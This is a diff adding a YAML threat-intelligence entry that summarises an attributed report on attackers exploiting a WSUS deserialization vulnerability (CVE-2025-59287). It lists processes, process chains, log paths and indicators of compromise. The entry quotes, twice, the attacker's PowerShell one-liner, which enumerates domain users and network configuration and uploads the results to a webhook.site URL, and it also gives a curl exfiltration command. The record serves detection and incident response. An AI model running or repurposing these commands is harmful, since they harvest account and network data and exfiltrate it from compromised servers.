@@ -1,0 +1,60 @@
+description: "Huntress observed exploitation of a deserialization vulnerability in\
+  \ WSUS (CVE\u20112025\u201159287) via exposed default ports 8530/8531, spawning\
+  \ cmd.exe and PowerShell to enumerate servers and exfiltrate data to a remote webhook."
+attribution: Unknown threat actor
+TTPs:
+  processes:
+  - wsusservice.exe
+  - w3wp.exe
+  - cmd.exe
+  - powershell.exe
+  - curl.exe
+  commandline:
+  - powershell -ectry{$r= (&{echo https://[REDACTED]:8531; net user /domain; ipconfig
+    /all} |out-string)+ $Error }catch{$_.ToString()} ;$w="http://webhook.site/[REDACTED]";try{iwr
+    -UseBasicParsing -Uri $w -Body $r -Method Put}catch{curl.exe -k $w --data-binary
+    $r}
+  - curl.exe -k http://webhook.site/<REDACTED> --data-binary <payload>
+  powershell:
+  - powershell -ectry{$r= (&{echo https://[REDACTED]:8531; net user /domain; ipconfig
+    /all} |out-string)+ $Error }catch{$_.ToString()} ;$w="http://webhook.site/[REDACTED]";try{iwr
+    -UseBasicParsing -Uri $w -Body $r -Method Put}catch{curl.exe -k $w --data-binary
+    $r}
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell.exe
+    destination: https://[REDACTED]:8531
+    port: 8531
+  - process: curl.exe
+    destination: http://webhook.site/<REDACTED>
+    port: 80
+  - process: wsusservice.exe
+    destination: <WSUS server IP or hostname>:8530/8531
+    port: 8530, 8531
+  file_activity:
+  - C:\\Program Files\\Update Services\\Logfiles\\SoftwareDistribution.log
+  - C:\\inetpub\\logs\\LogFiles\\W3SVC*\\u_ex*.log
+  persistence: []
+  process_relations:
+  - wsusservice.exe -> cmd.exe -> powershell.exe
+  - w3wp.exe -> cmd.exe -> powershell.exe
+  - powershell.exe -> curl.exe
+IOCs:
+  urls:
+  - https://[REDACTED]:8531
+  - http://webhook.site/[REDACTED]
+  - http://webhook.site/<REDACTED>
+  domains:
+  - webhook.site
+  files:
+  - C:\\Program Files\\Update Services\\Logfiles\\SoftwareDistribution.log
+  - C:\\inetpub\\logs\\LogFiles\\W3SVC*\\u_ex*.log
+authors:
+- Luke Wilkinson
+- Joshua Kiriakoff
+- Jordan Sexton
+reference: https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability
+date_of_publication: October 23, 2025
+file_creation_date: October 30, 2025
